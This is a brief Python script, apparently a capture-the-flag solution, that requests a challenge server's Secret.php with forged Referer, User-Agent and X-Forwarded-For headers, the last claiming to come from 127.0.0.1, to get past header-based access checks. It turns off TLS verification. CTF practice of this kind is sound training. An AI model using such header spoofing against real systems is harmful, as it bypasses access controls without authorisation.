import requests
url = "https://742eb3b1da2450279c28af88.tcp-ctf2.dasctf.com:9999/Secret.php"
headers={
        "Referer": "https://Sycsecret.buuoj.cn",
        "User-Agent": "Syclover",
        "X-Forwarded-For": "127.0.0.1",
    }
resp = requests.get(url,headers=headers,verify=False)
print(resp.text)